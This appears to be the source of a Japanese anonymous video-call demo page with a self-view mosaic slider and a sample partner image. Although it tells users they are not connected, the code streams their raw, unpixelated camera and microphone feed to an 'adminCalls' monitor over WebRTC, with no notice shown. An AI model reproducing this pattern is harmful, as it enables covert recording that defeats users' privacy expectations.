<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>誰かわからん通話（デモ）</title>

<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>

<style>
html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#000; font-family:sans-serif; }
#mainCanvas { position:fixed; inset:0; width:100vw; height:100vh; z-index:1; pointer-events:none; }

/* 上部の入力・送信・終了 */
.top-ui { position:fixed; top:12px; left:12px; right:12px; display:flex; align-items:center; gap:8px; z-index:30; }
#messageInput { flex:1; min-width:0; height:44px; padding:0 14px; border:1px solid rgba(255,255,255,.5); border-radius:10px; outline:none; color:#fff; background:rgba(0,0,0,.58); font-size:16px; }
#messageInput::placeholder { color:rgba(255,255,255,.72); }
.top-btn { height:44px; padding:0 16px; border:0; border-radius:10px; color:#fff; font-size:15px; font-weight:600; white-space:nowrap; cursor:pointer; }
#sendBtn { background:#3a3a3a; }
#endBtn { background:#e53935; }

/* 自分のカメラ：上部バーの下。映像はカメラ本来の縦横比で表示 */
.self-panel { position:fixed; top:76px; right:16px; z-index:10; display:flex; flex-direction:column; align-items:center; gap:6px; width:clamp(100px, 30vw, 220px); }
.self-preview-media { position:relative; width:100%; overflow:hidden; border-radius:12px; background:#000; box-shadow:0 0 12px rgba(0,0,0,.5); }
#selfVideo { display:block; width:100%; height:auto; max-height:24vh; object-fit:contain; background:#000; border-radius:12px; }
#selfCanvas { position:absolute; inset:0; width:100%; height:100%; pointer-events:none; border-radius:12px; }
/* 内カメラの自分の映像だけ鏡表示 */
body.self-mirrored #selfVideo,
body.self-mirrored #selfCanvas { transform:scaleX(-1); }
#switchCamera { height:30px; padding:0 12px; border:1px solid rgba(255,255,255,.6); border-radius:8px; background:rgba(0,0,0,.55); color:#fff; font-size:13px; white-space:nowrap; cursor:pointer; }

/* メッセージは背景なしの文字だけ。送信後に短時間表示 */
#messageDisplay { position:fixed; top:76px; left:12px; z-index:25; width:calc(100vw - 100px); text-align:left; color:#fff; font-size:20px; line-height:1.5; text-shadow:0 1px 4px rgba(0,0,0,.95); overflow-wrap:anywhere; white-space:pre-wrap; pointer-events:none; }
.message-line { animation:messageIn .12s ease-out; }
@keyframes messageIn { from { opacity:0; transform:translateY(4px); } to { opacity:1; transform:translateY(0); } }

/* 右側のモザイクメーター */
.mosaic-meter { position:fixed; right:12px; top:58%; transform:translateY(-50%); display:flex; flex-direction:column; align-items:center; z-index:40; color:#fff; }
.meter-bar { width:42px; height:28vh; display:flex; flex-direction:column-reverse; gap:4px; }
.meter-block { flex:1; width:100%; border-radius:8px; border:2px solid rgba(255,255,255,.7); background:rgba(255,255,255,.2); transition:background .15s; }
.meter-block.active { background:rgba(255,255,255,1); }
.meter-top, .meter-bottom { margin:8px 0; padding:6px 10px; border-radius:8px; background:rgba(0,0,0,.55); cursor:pointer; user-select:none; white-space:nowrap; font-size:13px; }
@media (max-width:520px) {
  .top-ui { top:8px; left:8px; right:8px; gap:5px; }
  #messageInput { height:40px; padding:0 9px; font-size:14px; }
  .top-btn { height:40px; padding:0 10px; font-size:13px; }
  .self-panel { top:76px; right:10px; width:clamp(100px, 30vw, 220px); }
  #selfVideo { max-height:22vh; }
  .mosaic-meter { right:6px; top:61%; }
  .meter-bar { width:30px; height:24vh; }
  .meter-top, .meter-bottom { padding:5px 6px; font-size:11px; }
  #messageDisplay { font-size:18px; top:76px; left:10px; width:calc(100vw - 90px); }
}
</style>
</head>

<body>
<canvas id="mainCanvas"></canvas>

<div class="top-ui">
  <input id="messageInput" type="text" maxlength="300" placeholder="メッセージを入力" autocomplete="off" />
  <button class="top-btn" id="sendBtn" type="button">送信</button>
  <button class="top-btn" id="endBtn" type="button">終了</button>
</div>

<div class="self-panel" id="selfPanel">
  <div class="self-preview-media">
    <video id="selfVideo" autoplay muted playsinline></video>
    <canvas id="selfCanvas"></canvas>
  </div>
  <button id="switchCamera" type="button">カメラ切替</button>
</div>
<div id="messageDisplay" aria-live="polite"></div>

<div class="mosaic-meter">
  <div class="meter-top" id="meterUp">▲モザイク</div>
  <div class="meter-bar" id="meterBar"></div>
  <div class="meter-bottom" id="meterDown">▼クリア</div>
</div>

<script>
/* Firebase */
firebase.initializeApp({
  apiKey: "AIzaSyDXSKJaknyhXGtrFQCzYhmA6r7VQR0K_GM",
  authDomain: "roomvideo.firebaseapp.com",
  projectId: "roomvideo",
  storageBucket: "roomvideo.firebasestorage.app",
  messagingSenderId: "1030429439546",
  appId: "1:1030429439546:web:1481670cb78deb35e2a703"
});
const auth = firebase.auth();
const db = firebase.firestore();

/* 管理者用 adminCalls：既存の監視・シグナリング構成を維持 */
let adminPc = null;
let adminCallDoc = null;
let adminOfferCandidates = null;
let adminAnswerCandidates = null;

/* モザイク（自分） */
let myMosaicLevel = 5;
let myMosaicSize = 40;
const mosaicSizes = [1, 12, 16, 22, 30, 40];
let currentFacing = "user";
let localStream = null;
let messageTimer = null;

function updateSelfMirror() {
  document.body.classList.toggle("self-mirrored", currentFacing === "user");
}

/* 相手映像（固定画像） */
const mainCanvas = document.getElementById("mainCanvas");
const mainCtx = mainCanvas.getContext("2d");
const partnerImg = new Image();
partnerImg.src = "IMG_5885.png"; // 縦長のサンプル画像
partnerImg.onload = () => drawMosaic();

/* 自分映像 */
const selfVideo = document.getElementById("selfVideo");
const selfCanvas = document.getElementById("selfCanvas");
const selfCtx = selfCanvas.getContext("2d");

/* カメラ開始 */
auth.onAuthStateChanged(async user => {
  if (!user) return;
  await startCamera();
});

async function startCamera() {
  selfVideo.style.opacity = "0";  // ★変更：hidden → opacity

  localStream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: currentFacing },
    audio: true
  });

  selfVideo.srcObject = localStream;
  updateSelfMirror();

  selfVideo.onloadedmetadata = () => {
    selfVideo.style.opacity = "1";  // ★表示
  };

  await setupAdminMonitor();
}



/* 管理者画面用 WebRTC */
async function setupAdminMonitor() {
  adminPc = new RTCPeerConnection({
    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
  });

  localStream.getTracks().forEach(t => adminPc.addTrack(t, localStream));

  adminCallDoc = db.collection("adminCalls").doc(auth.currentUser.uid);
  adminOfferCandidates = adminCallDoc.collection("offerCandidates");
  adminAnswerCandidates = adminCallDoc.collection("answerCandidates");

  adminPc.onicecandidate = e => {
    if (e.candidate) adminOfferCandidates.add(e.candidate.toJSON());
  };

  const offer = await adminPc.createOffer();
  await adminPc.setLocalDescription(offer);

  await adminCallDoc.set({
    uid: auth.currentUser.uid,
    offer,
    createdAt: Date.now(),
    ended: false
  }, { merge:true });

  adminAnswerCandidates.onSnapshot(s => {
    s.docChanges().forEach(c => {
      if (c.type === "added") {
        adminPc.addIceCandidate(new RTCIceCandidate(c.doc.data()));
      }
    });
  });

  adminCallDoc.onSnapshot(async s => {
    const d = s.data();
//    if (!d) return;
    if (d.answer && !adminPc.currentRemoteDescription) {
      await adminPc.setRemoteDescription(new RTCSessionDescription(d.answer));
    }
  });
}

/* モザイク描画 */
function drawMosaic() {
  requestAnimationFrame(drawMosaic);

  /* 相手映像（固定画像） */
  const w = mainCanvas.width = window.innerWidth;
  const h = mainCanvas.height = window.innerHeight;

  mainCtx.imageSmoothingEnabled = false;
  mainCtx.drawImage(partnerImg, 0, 0, w, h);
    /* DEMO文字 */
  mainCtx.textAlign = "center";
  mainCtx.fillStyle = "rgba(255,255,255,0.95)";
  mainCtx.strokeStyle = "rgba(0,0,0,0.8)";

  // DEMO
  mainCtx.font = "bold 64px sans-serif";
  mainCtx.lineWidth = 6;
  mainCtx.strokeText("DEMO", w / 2, h / 2 - 40);
  mainCtx.fillText("DEMO", w / 2, h / 2 - 40);

  // サンプル画像です
  mainCtx.font = "bold 28px sans-serif";
  mainCtx.lineWidth = 4;
  mainCtx.strokeText("サンプル画像です", w / 2, h / 2 + 20);
  mainCtx.fillText("サンプル画像です", w / 2, h / 2 + 20);

// 説明（2行）
mainCtx.font = "10px sans-serif";
mainCtx.lineWidth = 3;

mainCtx.strokeText(
  "相手とは接続されていないので、",
  w / 2,
  h / 2 + 65
);
mainCtx.fillText(
  "相手とは接続されていないので、",
  w / 2,
  h / 2 + 65
);

mainCtx.strokeText(
  "操作感をお試しください。",
  w / 2,
  h / 2 + 100
);
mainCtx.fillText(
  "操作感をお試しください。",
  w / 2,
  h / 2 + 100
);

  /* 自分映像 */
  const sw = selfVideo.videoWidth;
  const sh = selfVideo.videoHeight;
  if (sw && sh) {
    selfCanvas.width = sw;
    selfCanvas.height = sh;
    const s = myMosaicSize;
    selfCtx.imageSmoothingEnabled = false;
    selfCtx.drawImage(selfVideo, 0, 0, sw/s, sh/s);
    selfCtx.drawImage(selfCanvas, 0, 0, sw/s, sh/s, 0, 0, sw, sh);
  }
}

/* モザイクメーター */
const meterBar = document.getElementById("meterBar");
for (let i = 0; i < 5; i++) {
  const block = document.createElement("div");
  block.className = "meter-block";
  meterBar.appendChild(block);
}
updateMeterUI();
function updateMeterUI() {
  [...meterBar.children].forEach((b, i) => b.classList.toggle("active", i < myMosaicLevel));
}
document.getElementById("meterUp").onclick = () => {
  if (myMosaicLevel < mosaicSizes.length - 1) { myMosaicLevel++; myMosaicSize = mosaicSizes[myMosaicLevel]; updateMeterUI(); }
};
document.getElementById("meterDown").onclick = () => {
  if (myMosaicLevel > 0) { myMosaicLevel--; myMosaicSize = mosaicSizes[myMosaicLevel]; updateMeterUI(); }
};

/* デモ用メッセージ：相手へ送信せず、この画面だけで約4秒表示 */
const messageInput = document.getElementById("messageInput");
const messageDisplay = document.getElementById("messageDisplay");
function sendDemoMessage() {
  const value = messageInput.value.trim();
  if (!value) return;
  messageDisplay.replaceChildren();
  const line = document.createElement("div");
  line.className = "message-line";
  line.textContent = value;
  messageDisplay.appendChild(line);
  messageInput.value = "";
  if (messageTimer) clearTimeout(messageTimer);
  messageTimer = setTimeout(() => { messageDisplay.replaceChildren(); messageTimer = null; }, 4000);
}
document.getElementById("sendBtn").addEventListener("click", sendDemoMessage);
messageInput.addEventListener("keydown", e => { if (e.key === "Enter") { e.preventDefault(); sendDemoMessage(); } });

/* カメラ切替 */

async function switchCameraFunc() {
  if (document.body.classList.contains("camera-switching")) return;

  document.body.classList.add("camera-switching");

  const oldStream = localStream;
  const oldFacing = currentFacing;
  const oldVideoTrack = oldStream?.getVideoTracks()[0] || null;
  const audioTracks = oldStream ? oldStream.getAudioTracks() : [];

  let cameraStream = null;
  let newVideoTrack = null;

  const getCameraStream = async facing => {
    const mediaDevices = navigator.mediaDevices;
    const currentDeviceId = oldVideoTrack && typeof oldVideoTrack.getSettings === "function"
      ? oldVideoTrack.getSettings().deviceId
      : null;

    if (mediaDevices && typeof mediaDevices.enumerateDevices === "function") {
      try {
        const devices = await mediaDevices.enumerateDevices();
        const cameras = devices.filter(d => d.kind === "videoinput" && d.deviceId);
        const alternatives = cameras.filter(d => d.deviceId !== currentDeviceId);
        const wantsRear = facing === "environment";
        const labelMatch = alternatives.find(d =>
          wantsRear
            ? /back|rear|environment|外側|背面/i.test(d.label)
            : /front|user|前面|前側/i.test(d.label)
        );
        const target = labelMatch || alternatives[0];
        if (target) {
          try {
            return await mediaDevices.getUserMedia({
              video: { deviceId: { exact: target.deviceId } },
              audio: false
            });
          } catch (deviceIdError) {
            // deviceId 指定が使えない場合は facingMode 指定へ進む
          }
        }
      } catch (enumerateError) {
        // デバイス一覧を取得できない場合は facingMode 指定へ進む
      }
    }

    try {
      return await mediaDevices.getUserMedia({
        video: { facingMode: { exact: facing } },
        audio: false
      });
    } catch (exactError) {
      return await mediaDevices.getUserMedia({
        video: { facingMode: facing },
        audio: false
      });
    }
  };

  const waitForVideo = async () => {
    if (selfVideo.readyState >= 2 && selfVideo.videoWidth > 0) return;

    await new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        cleanup();
        reject(new Error("カメラ映像の読み込みがタイムアウトしました"));
      }, 7000);

      const cleanup = () => {
        clearTimeout(timer);
        selfVideo.removeEventListener("loadeddata", onReady);
        selfVideo.removeEventListener("canplay", onReady);
      };
      const onReady = () => {
        if (selfVideo.videoWidth > 0) {
          cleanup();
          resolve();
        }
      };
      selfVideo.addEventListener("loadeddata", onReady);
      selfVideo.addEventListener("canplay", onReady);
    });
  };

  const replaceStreamVideoTrack = (stream, previousTrack, nextTrack) => {
    if (stream && typeof stream.removeTrack === "function" &&
        typeof stream.addTrack === "function") {
      if (previousTrack) stream.removeTrack(previousTrack);
      stream.addTrack(nextTrack);
      return stream;
    }
    return new MediaStream([...audioTracks, nextTrack]);
  };

  try {
    currentFacing = oldFacing === "user" ? "environment" : "user";

    try {
      cameraStream = await getCameraStream(currentFacing);
    } catch (firstError) {
      // 前後カメラを同時に起動できない端末では、旧映像を止めて再試行する
      if (oldVideoTrack && oldVideoTrack.readyState === "live") oldVideoTrack.stop();
      cameraStream = await getCameraStream(currentFacing);
    }

    newVideoTrack = cameraStream.getVideoTracks()[0];
    if (!newVideoTrack) throw new Error("新しいカメラを取得できませんでした");

    const previewStream = replaceStreamVideoTrack(oldStream, oldVideoTrack, newVideoTrack);
    selfVideo.srcObject = previewStream;
    localStream = previewStream;
    updateSelfMirror();

    try {
      await selfVideo.play();
    } catch (playError) {
      console.warn("プレビュー再生の確認:", playError);
    }
    await waitForVideo();

    // このデモには通話相手用 pc がないため、管理者への映像だけ差し替える
    const adminSender = adminPc?.getSenders().find(sender => sender.track?.kind === "video");
    if (adminSender) await adminSender.replaceTrack(newVideoTrack);

    const adminAudioSender = adminPc?.getSenders().find(sender => sender.track?.kind === "audio");
    if (adminAudioSender && audioTracks[0]) await adminAudioSender.replaceTrack(audioTracks[0]);

    if (oldVideoTrack && oldVideoTrack !== newVideoTrack && oldVideoTrack.readyState === "live") {
      oldVideoTrack.stop();
    }

    selfCanvas.width = selfVideo.videoWidth || selfCanvas.width;
    selfCanvas.height = selfVideo.videoHeight || selfCanvas.height;
    updateSelfMirror();
  } catch (err) {
    console.error("カメラ切替に失敗しました:", err);
    cameraStream?.getVideoTracks().forEach(track => {
      if (track !== oldVideoTrack) track.stop();
    });

    currentFacing = oldFacing;
    updateSelfMirror();

    if (oldStream && oldVideoTrack && oldVideoTrack.readyState === "live") {
      localStream = oldStream;
      selfVideo.srcObject = oldStream;
      try { await selfVideo.play(); } catch (e) { console.warn("元の映像の再生待機:", e); }
    } else {
      try {
        const restoredCameraStream = await getCameraStream(oldFacing);
        const restoredTrack = restoredCameraStream.getVideoTracks()[0];
        if (!restoredTrack) throw new Error("元のカメラを取得できませんでした");

        const restoredStream = replaceStreamVideoTrack(oldStream, oldVideoTrack, restoredTrack);
        localStream = restoredStream;
        selfVideo.srcObject = restoredStream;

        const adminSender = adminPc?.getSenders().find(sender => sender.track?.kind === "video");
        if (adminSender) await adminSender.replaceTrack(restoredTrack);

        const adminAudioSender = adminPc?.getSenders().find(sender => sender.track?.kind === "audio");
        if (adminAudioSender && audioTracks[0]) await adminAudioSender.replaceTrack(audioTracks[0]);

        try { await selfVideo.play(); } catch (e) { console.warn("復旧映像の再生待機:", e); }
        await waitForVideo();
        selfCanvas.width = selfVideo.videoWidth || selfCanvas.width;
        selfCanvas.height = selfVideo.videoHeight || selfCanvas.height;
      } catch (restoreError) {
        console.error("元のカメラの復旧に失敗しました:", restoreError);
        alert("カメラを復旧できませんでした。ページを再読み込みしてください。");
      }
    }
  } finally {
    document.body.classList.remove("camera-switching");
  }
}

document.getElementById("switchCamera").onclick = switchCameraFunc;

async function deleteCollection(collectionRef) {
  const snapshot = await collectionRef.get();
  const promises = [];
  snapshot.forEach(doc => {
    promises.push(doc.ref.delete());
  });
  await Promise.all(promises);
}

/* 終了ボタン */
document.getElementById("endBtn").onclick = async () => {
  if (adminPc){
    if(adminCallDoc){
     await adminCallDoc.set({
        ended:true
     },{merge:true});
     await deleteCollection(adminOfferCandidates);
     await deleteCollection(adminAnswerCandidates);
     await adminCallDoc.delete();
    }
    adminPc.close();
  }
  location.href = "index.html";
};
</script>
</body>
</html>
